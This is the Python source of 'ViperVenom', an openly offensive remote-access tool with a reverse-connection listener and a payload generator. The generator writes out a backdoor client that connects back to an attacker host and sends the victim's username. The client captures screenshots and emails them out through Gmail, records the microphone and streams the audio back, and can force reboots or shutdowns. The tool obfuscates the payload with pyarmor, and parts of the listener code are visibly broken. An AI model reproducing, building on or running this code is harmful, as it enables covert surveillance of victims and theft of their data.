    #Eclipse Public License - v 2.0

    #THE ACCOMPANYING PROGRAM IS PROVIDED UNDER THE TERMS OF THIS ECLIPSE
    #PUBLIC LICENSE ("AGREEMENT"). ANY USE, REPRODUCTION OR DISTRIBUTION
    #OF THE PROGRAM CONSTITUTES RECIPIENT'S ACCEPTANCE OF THIS AGREEMENT.









import socket
import time
import platform
import os
import threading
from scipy.io.wavfile import _handle_pad_byte
from termcolor import colored
from Tools import *
import base64
import random, string
import cv2, pickle, struct
# =====================================================> Clears Terminal
def Clear():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system("clear")

Clear()

time.sleep(2)

# =====================================================> Banner
def Banner():
    
    print(colored(""";cll:::;;cc:;'';;;;;''..''.',;;,'..'...'.......',;:;,'........,,,''',,;,'...............'................................,,,;cc;,:
;::;;::;,,;::;;;:::;;;,'..',,,,''...''''''''....',;;,''','''...'''..',;:,'... ....................'......''..... .......''',,::;;;
:::;;;,;:c:;::;,;:::::::;,::;'....',;,'''''.....',,'........'',,,,,,,,,;:;;,'........ .   .....  ..'.....'........... ......',;:;;
:;',,'.':cc:,,;;',;:;,,::;;;;,'...'''.......';c:;;;,'''''''',,;;::::c::c::::;;,'... ........................  .........'......';;'
::;;,,;,',::,.',,,;::;'',;,''............';cccl:;,,,''',''''',,;;::;:::::,',;::;,,'..........................  .......''........''
:col;,;:;,',;,'',,.',;;'',,'..........,coodolcc::,'',,,,..,,''',;;;;;;;::;;::;;::cccc:'..  ... ... ..  ..   ...      ....'.. ...''
l:;cc:,,;;'';;,......';,.....   .....:xkxdoolc;,,;,'',,,'',,,,,''',;;'';;;::;;:clllllodc.    ..      .      ...        ....    ..'
ol::c;'.',''''..  ....','....... ...'lxdddoollc:,,;;,,,'''',,,,,,,,,,,,,,,,;::ccc:cccodxl'                  ....      .. ...    ..
,::,,;,'';;,...   ..................,odxxxdc,',:c:cc:;;,'',;:;;;;,,,;;,,;,,::cll:,,;,:ooxl. .                   ......   ......   
.;c;'...';:;.       .....'..........:xddxddl,,,;cccllcc:,,,;;;:;;;;;;,'',c:;:lolol'.''codo,.       ..       .     .....  .. ...   
.,c:......''.....    ...............lxdddddolodkOxloddl:,...''''''''',;;:,.'cddokkl;,;ddod:.      ....                    .       
..,;'.'',,',,,.....  ..............,dkkkxxxkkkkOK0o:clooc:,,,'.. ...''';;'..cclxddkxdxkxddc.        ...                 .         
;;.,;'',;:'.'......................ck0OOOOO00OOkOOdclol:co:,..       ..,;;',oxol;lO0Okxdkxo'        ..           .      ..     .. 
';'.;,..:c,....... ............''.'lO000000000dcoko:ooc;:;,,.  ....  .,;cc:;lkkl::lxOkkOxol,.    ..            . .. ...... ..  ...
,;'.,'..',;........................;oO00000OOOxoodoc:llc:;,,...   .......,:lcclcclccccoxxdo,       ..    ......... .. ....      ..
',,..','..'...'........''...........'cxkxxkkkOOkddooccc;'.',..      .,,'. ...,;;;;::::clllc.                                      
'';'.,:'.'...,'.'''....''.............:c:;;;;;,,'....    .ll.       .od;     ......''',;,,.                                       
,:c;'''','..''..'''...''..............,:;'..             .c:         :c.           ....::.                                        
;;:;'.',,'.''...''..........         ..,'...              ,,         ,;             ..:d;                                         
:;,'.','..........                     .....              ..         ''       .    ..,dd'                                         
;,.....                                 ....  ....        ..         ..     ........'ckl.                                         
.                                       .'...........      . .......        .......'ckx'                                          
                                         .'.............  .....   ...   ...........'lx;                                           
                                         .'''.................    .................;d:                                            
                                          .,,,.................  .................;oc.                                            
,..                                        .,;,'...............  ................;do.                                             
',,..                                       ..,,'..............  ..............':ol.                                              
......''..                                    .'''.............  .............,coc.                                               
.......''..                                     ...............  ...........';ll,                                                 
........',...''.....                              .............  .........';:c;.                                                  
..........'...',,''.'''..                           ...........  ......'',;;'.                                                    
......''...',...,;'..,;:;'.....                       ........   ...'..'...                                                       
........,'..,;,..';,..';:;'',;,..,,....                           .....                                                           
 ........'....','....';;:::,...,,,:ccc,'''.......                                                                                 
...............,;;'..,:;'.',,'.,cccccc;,,,,',;;,''''......                                                                        
  ....  ...'.....,,....,,'',;:;,:lol:;,,,;,'..'',,'....','........                                                                
... .......','...':;,..';,,,;:c::;;::;,...,;'...,;,'....,;,....;,'...''..    """, 'cyan'))
    print(colored("             The quieter you become, the more you can hear, ViperVenom", "blue"))
    print()
Banner()
# =====================================================> Main Menu


def Menu():
    print(colored("""
1 | Start Handler Listener
""", 'cyan'))
    print(colored("""
2 | Generate ViperVenom Payload
""", 'red'))
    print()
# =====================================================> Vars

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
BUFFER_SIZE = 1024
global ListenerHost
global ListenerPort
# =====================================================> Backdoor Listener

def Listener():
    while True:
        landingHandler = input("/ViperVenom/ > ")
        if landingHandler == "show payloads":
            print(colored('''
            Available Payloads Any Windows: \n
            1 | windows/vipervenom/tcp/payload | Best Option for Windows Exploitation.\n
            ''', "cyan"
            ))
        if landingHandler == "use windows/vipervenom/tcp/payload":
                while True:
                    firstHandler = input(colored("(Listener) Windows/ViperVenom/TCP/Payload > ", "red"))
                    if firstHandler[:8] == "set host":
                        ListenerHost = firstHandler[9:]
                    if firstHandler[:8] == "set port":
                        ListenerPort = firstHandler[9:]
                    if firstHandler == "show host":
                        print(f"LHOST={ListenerHost}")
                    if firstHandler == "show port":
                        print(f"LPORT={ListenerPort}")
                    if firstHandler == "run":
                            s.bind((ListenerHost, int(ListenerPort)))
                            s.listen()
                            time.sleep(1)
                            print(colored("[*] Starting Listener...", 'cyan'))
                            time.sleep(1)
                            print(colored("Listener Started, Waiting for Connections...", "red"))
                            conn, addr = s.accept()
                            with conn:
                                print(colored(f"[*] Recived Connection From: {addr}", 'blue'))
                                print(colored("[*] Connecting to Device.", 'blue'))
                                time.sleep(1)

                                while True:


                                    Handler = input(colored(f"{addr[0]} ", "cyan"))
                                    if Handler == "clear":
                                        if platform.system() == "Linux":
                                            os.system('clear')
                                        else:
                                            os.system("cls")
                                    elif Handler == "screenshot":
                                        conn.send(Handler.encode("utf-8"))
                                    elif Handler == "exit":
                                        conn.send(Handler.encode("utf-8"))
                                        print(colored("[*] Exiting From Active Session...", "green"))
                                        time.sleep(3)
                                        conn.close()
                                    elif Handler == "mic record":
                                        conn.send(Handler.encode("utf-8"))
                                        letters = string.ascii_letters
                                        with open(f'{random.choice(letters)}.wav','wb') as f:
                                            while True:
                                                l = conn.recv(1024)
                                                if not l: break
                                                f.write(l)
                                                time.sleep(60)
                                                break
                                    elif Handler == "restart":
                                        conn.send(Handler.encode("utf-8"))
                                    elif Handler == "shutdown":
                                        conn.send(Handler.encode("utf-8"))
                                    elif Handler == "screenshare":
                                        data = b""
                                        payload_size = struct.calcsize("Q")
                                        while True:
                                            while len(data) < payload_size:
                                                packed_msg_size = data[:payload_size]
                                                data = data[payload_size:]
                                                msg_size = struct.unpack("Q", packed_msg_size) [0]

                                            while len(data) < msg_size:
                                                data += conn.recv(4*BUFFER_SIZE)
                                                frame_data = data [:msg_size]
                                                data = data[msg_size:]
                                                frame = pickle.loads()
                                                cv2.imshow("ViperVenom", frame)
                                                key = cv2.waitKey(1) & 0xFF
                                                if key == ord('q'):
                                                    break









def PayloadGenerator():
    while True:
        landingHandler = input("/ViperVenom/ > ")
        if landingHandler == "show payloads":
            print(colored(colored('''
            Available Payloads Any Windows: \n
            1 | generator/vipervenom/tcp/payload | Best Option for Windows Exploitation.\n
            ''', "cyan"
            )))
        if landingHandler == "use generator/vipervenom/tcp/payload":
                while True:
                    firstHandler = input(colored("(Generator) Windows/ViperVenom/TCP/Payload > ", "red"))
                    if firstHandler[:8] == "set host":
                        clientHOST = firstHandler[9:]
                    if firstHandler[:8] == "set port":
                        clientPORT = firstHandler[9:]
                    if firstHandler == "show host":
                        print(f"HOST={clientHOST}")
                    if firstHandler == "show port":
                        print(f"PORT={clientPORT}")
                    if firstHandler[:13] == "set gmailaddr":
                        SetYourEmail = firstHandler[14:]
                    if firstHandler == "show gmailaddr":
                        print(f"GAMILADDR={SetYourEmail}")
                    if firstHandler[:13] == "set gmailpass":
                        SetYourEmailPassword = firstHandler[14:]
                    if firstHandler == "show gmailpass":
                        print(f"GAMILPASS={SetYourEmailPassword}")
                    if firstHandler[:12] == "set filename":
                        SetFileName = firstHandler[13:]
                    if firstHandler == "show filename":
                        print(f"FILENAME={SetFileName}")
                    if firstHandler[:13] == "set micrecord":
                        micrecordsec = firstHandler[14:]
                    if firstHandler == "show micrecord":
                        print(f"MICRECORD={micrecordsec}")
                    
                    
                    
                    
                    
                    if firstHandler == "generate":
                        print(colored("[*] Generating Payload", 'red'))
                        time.sleep(1)
                        print(".")
                        time.sleep(1)
                        print("..")
                        time.sleep(1)
                        print("...")
                        with open(SetFileName, "w") as malfile:
                            malfile.write(
                                f'''
                    
    #Eclipse Public License - v 2.0

    #THE ACCOMPANYING PROGRAM IS PROVIDED UNDER THE TERMS OF THIS ECLIPSE
    #PUBLIC LICENSE ("AGREEMENT"). ANY USE, REPRODUCTION OR DISTRIBUTION
    #OF THE PROGRAM CONSTITUTES RECIPIENT'S ACCEPTANCE OF THIS AGREEMENT.


from PIL import ImageGrab
import socket
import getpass
import smtplib
import base64
import os
import platform
import sounddevice
from scipy.io.wavfile import write
import time
import random, string
clientHOST = "{clientHOST}"
clientPORT = {clientPORT}
BUFFER_SIZE = 1024
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((clientHOST, clientPORT))
s.send(str(getpass.getuser()).encode("utf-8"))
while True:
    Handler_DATA = s.recv(BUFFER_SIZE).decode("utf-8")
    if Handler_DATA == "screenshot":
        screenshot = ImageGrab.grab()
        file = "screenshot.jpg"
        screenshot.save(file)
        f = open('screenshot.jpg', 'rb')
        data=f.read()
        data=base64.b64encode(data)
        f.close()
        os.remove(file)
        smtp = smtplib.SMTP('smtp.gmail.com', 587) # Enable security reasons, open a new Gmail account, and enable "Less secure apps" in your account settings
        smtp.starttls()
        smtp.login("{SetYourEmail}", "{SetYourEmailPassword}")
        message = data
        smtp.sendmail("{SetYourEmail}", "{SetYourEmail}", message)
        smtp.quit()
    elif Handler_DATA == "mic_record":
        frames = 44100
        seconds = {micrecordsec}
        channel = 1
        record = sounddevice.rec(int(seconds*frames), samplerate=frames, channels=channel)
        sounddevice.wait()
        file = f"{random.choice(string.ascii_letters)}.wav"
        write(file, frames, record)
        with open(file, 'rb') as f:
            for l in f: s.sendall(l)
            time.sleep(10)

            os.remove(file)
    elif Handler_DATA == "persistence":
        pass
    elif Handler_DATA == "restart":
        if platform.system() == "Windows":
            os.system("shutdown -t 0 -r -f")
        else:
            os.system("reboot")
    elif Handler_DATA == "shutdown":
        if platform.system() == "Windows":
            os.system("shutdown /s /t 1")
        else:
            os.system("shutdown now")
    elif Handler_DATA == "exit":
        s.close()
        exit()
                    
                                '''
                            )
                            print(colored("[*] Converting Code to a Shellcode, Please Wait", 'green'))
                            time.sleep(1)
                            print(".")
                            time.sleep(1)
                            print("..")
                            time.sleep(1)
                            print("...")
                            os.system(f"pyarmor obfuscate {SetFileName}")
                            time.sleep(1)
                        print(colored("[*] Payload Generated, Payload is Ready.", 'red'))
                        time.sleep(1)
                        #os.remove(setFileName)
                        redirectListener = input(colored("[*] Would You Like to Start Listener? ", "cyan"))
                        if redirectListener == "yes":
                            Listener()
                        if redirectListener == "y":
                            Listener()
                        if redirectListener == "no":
                            exit()
                        if redirectListener == "n":
                            exit()


# =====================================================> Menu Option
while True:
    des = input(colored("Landing/ViperVenom/ > ","red"))
    if des == "use 1":
        Listener()
    if des == "use 2":
        PayloadGenerator()
    if des == "list show":
        Menu()
    if des == "list":
        Menu()
    if des == "show list":
        Menu()

else:
    print(colored("[*] ERROR Invaild Argument, Exiting...", "red"))
    while True:
        break

        
